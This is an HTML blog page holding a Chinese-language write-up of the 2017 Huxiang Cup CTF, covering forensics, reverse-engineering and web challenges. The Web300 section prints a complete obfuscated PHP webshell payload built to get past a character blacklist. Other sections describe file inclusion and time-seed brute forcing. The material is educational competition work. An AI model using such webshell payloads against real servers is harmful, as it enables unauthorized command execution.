@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        hxctf2017-writeup · \xeb\xfe&#39;s Blog
+        
+    </title>
+    <link rel="icon" href= /assests/favicon.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20171020 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >\xeb\xfe&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">hxctf2017-writeup</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>\xeb\xfe's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(http://oumn0o088.bkt.clouddn.com/post-bg.jpg)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            hxctf2017-writeup
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2017/11/26</span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="2017年-“湖湘杯”网络安全技能大赛部分Writeup"><a href="#2017年-“湖湘杯”网络安全技能大赛部分Writeup" class="headerlink" title="2017年 “湖湘杯”网络安全技能大赛部分Writeup"></a>2017年 “湖湘杯”网络安全技能大赛部分Writeup</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="热身运动"><a href="#热身运动" class="headerlink" title="热身运动"></a>热身运动</h3><p>一张gif动图，通过命令convert pink.gif output.png对分割每一帧图片，看到跳跳虎的每个坐标位置，写成文本,图片及转换好的文本如下：<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/89085220.jpg" alt=""><br><code>5B4G2B4B5B2H3E2B5F8F1E2B7F6F1F4G5F6G1B3G5G6H2E</code><br>搜索64进制，得到一张图片，跟跳跳虎的8*8类似，把坐标转换成数字<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/8302437.jpg" alt=""><br><code>25 38 49 33 25 55 44 49 29 5 60 49 13 21 61 38 29 22 57 46 30 23 52</code><br>Base64也是0-63索引，将数字字符串转成base64，base64表和转换好的文本如下：<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/46159891.jpg" alt=""><br><code>ZmxhZ3sxdF8xNV9mdW5ueX0</code><br>再把转换好的文本进行base64解码，得到flag<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/77104194.jpg" alt=""></p>
+<h3 id="Encryptor-apk"><a href="#Encryptor-apk" class="headerlink" title="Encryptor.apk"></a>Encryptor.apk</h3><p>下载后得到一个加密的apk和加密后的flag文件，安装apk后发现apk名字是image加密者，估计是对jpg图片进行加密，先进行反编译，打开解密的算法未发现突破点。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/38464472.jpg" alt=""><br>因为解密代码并没有什么实质的部分，只好去看看加密代码的这一块。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/20546151.jpg" alt=""><br>发现这里对输入的文件进行了异或，异或是可逆的，只要对加密文件再加密一次就可以得到flag，于是改后缀为jpg，对文件再次进行加密。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/91302200.jpg" alt=""><br>得到了加密后的文件，改回后缀名jpg，打开图片得到flag。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/5046479.jpg" alt=""></p>
+<h3 id="MISC300"><a href="#MISC300" class="headerlink" title="MISC300"></a>MISC300</h3><p>下载得到一个pixels.jpg.pkl文件，然后通过cPickle写的脚本读取文件的内容：<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/38544084.jpg" alt=""><br>提示是一个黑白图片，list上是坐标，然后通过修改代码生成图片,脚本代码和生成的图片如下：<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/24236822.jpg" alt=""><br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/75441272.jpg" alt=""><br>本来以为生成图片之后能够直接看到flag，但是并没有，通过搜索得到原题，flag是“加尔文和霍布斯”漫画的作者是“比尔•沃特森” ，输入<code>billwatterson</code>，提交得分。</p>
+<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>通过wireshark打开流量包，输入过滤规则：<code>tcp contains &quot;flag&quot;</code>，然后看到HTTP流量中存在一个flag.zip，通过HTTP对象导出flag.zip<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/29257218.jpg" alt=""><br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/9023550.jpg" alt=""><br>解压flag.zip文件后发现一个文本ce.txt,里面是RGB的信息。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/67358800.jpg" alt=""><br>通过编辑RGB画图脚本生成图片,脚本代码如下：<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/86179478.jpg" alt=""><br>生成图片，得到flag。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/97753154.jpg" alt=""></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Re4newer"><a href="#Re4newer" class="headerlink" title="Re4newer"></a>Re4newer</h3><p>下载之后，放入peid查壳，发现是upx的壳，好办，直接扔进脱壳机。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/13775525.jpg" alt=""><br>脱壳之后放入神器ida。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/83073077.jpg" alt=""><br>搜索字符串发现了成功和失败的字样，进去look look。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/96839170.jpg" alt=""><br>一共是44次循环，每一次都将数据与0x22进行异或，去v4到v14中，把数据拿出来之后写脚本，得到flag。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/3956582.jpg" alt=""><br>脚本代码如下：<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/52326246.jpg" alt=""></p>
+<h3 id="简单的安卓"><a href="#简单的安卓" class="headerlink" title="简单的安卓"></a>简单的安卓</h3><p>下载之后直接反编译，可以在入口处看到flag，真的很简单23333<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/30138651.jpg" alt=""></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web200"><a href="#Web200" class="headerlink" title="Web200"></a>Web200</h3><p>根据题目提示，上传一个PNG文件，服务器就会保存它。然后随便上传了一个png文件，发现302，什么东西都没有。访问首页发现 op是一个get参数，尝试其他特殊字符，接着给我弹出来一个<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/6795472.jpg" alt=""><br>吓了宝宝一跳，不要怂就是干，然后尝试文件包含读index.php，读到源码<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/45664192.jpg" alt=""><br>通过include以及存在的链接，然后读upload.php，发现common.php继续读，尝试读flag.php，flag直接出来了,233333<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/77661805.jpg" alt=""><br>后面读源码发现还有其他方法，绕过上传图片使用zip://包含webshell也可以任意执行命令，从而读取flag.php，查看源码后发现flag。<br>flag截图如下:<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/31346264.jpg" alt=""></p>
+<h3 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h3><p>打开首页发现要输入一个随机值，尝试刷新，发现页面有变化，但不知道算法，爆破不了，题目未改之前通过swp查找源码都没找到，后面题目改了一下，通过swp源码泄露读到源码。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/65033795.jpg" alt=""><br>randpwd随机生成，跟time()有关，开始构造代码进行爆破，获取网页内容并打印出来。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/52296261.jpg" alt=""><br>经过一段时间爆破，得到flag，截图如下:<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/7605960.jpg" alt=""></p>
+<h3 id="Web300"><a href="#Web300" class="headerlink" title="Web300"></a>Web300</h3><p>打开首页，对源代码进行分析，发现黑名单过滤了很多字符，参数传值不在黑名单会直接写入文件中，文件名随机生成，经过测试还有几个字符没有进行过滤，例如<code>$_()[]+’;</code> , 然后开始构造webshell。<br>由于+在传送中会被解释为空格，所以需要提前url编码为%2b<br>Payload:</p>
+<pre><code>$_=&apos;&apos;;$_[%2b$_]%2b%2b;$_=$_.&apos;&apos;;$__=$_[%2b&apos;&apos;];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&apos;_&apos;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]); 
+</code></pre><p>通过content传参，成功后会得到一个shell的地址。<br><code>http://x.x.x.x/?content=payload</code><br>打开shell地址，post数据过去,查看源码读到flag。如下图：<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/78992810.jpg" alt=""><br>参考链接：<a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/" target="_blank" rel="noopener">一道好玩的webshell题</a></p>
+<p><em>转载请保留原文链接及作者。</em></p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+        
+            <li class="previous">
+                <a href= "/2017/11/24/blog/" title= My blog >
+                    <span>往后一页</span>
+                    <span>My blog</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:447344932@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/doge-dog" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2017年-“湖湘杯”网络安全技能大赛部分Writeup"><span class="toc-number">1.</span> <span class="toc-text">2017年 “湖湘杯”网络安全技能大赛部分Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#热身运动"><span class="toc-number">1.1.1.</span> <span class="toc-text">热身运动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encryptor-apk"><span class="toc-number">1.1.2.</span> <span class="toc-text">Encryptor.apk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC300"><span class="toc-number">1.1.3.</span> <span class="toc-text">MISC300</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#流量分析"><span class="toc-number">1.1.4.</span> <span class="toc-text">流量分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">1.2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Re4newer"><span class="toc-number">1.2.1.</span> <span class="toc-text">Re4newer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的安卓"><span class="toc-number">1.2.2.</span> <span class="toc-text">简单的安卓</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web200"><span class="toc-number">1.3.1.</span> <span class="toc-text">Web200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Random"><span class="toc-number">1.3.2.</span> <span class="toc-text">Random</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web300"><span class="toc-number">1.3.3.</span> <span class="toc-text">Web300</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>tags</span>
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive" >目前才写: 2 篇博文，好好努力吧，骚年。 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2017/11/26/hxctf2017-writeup/" >hxctf2017-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2017/11/24/blog/" >My blog</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name"><a href= "#">小试牛刀</a></span>
+    
+    </div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #888; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: false
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tag-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var jsInfo = {
+        root: '/'
+    }
+</script>
+    <!-- 不蒜子  -->
+    
+    <!-- CNZZ统计  -->
+    
+    </div>
+    </body>
+</html>
+
+
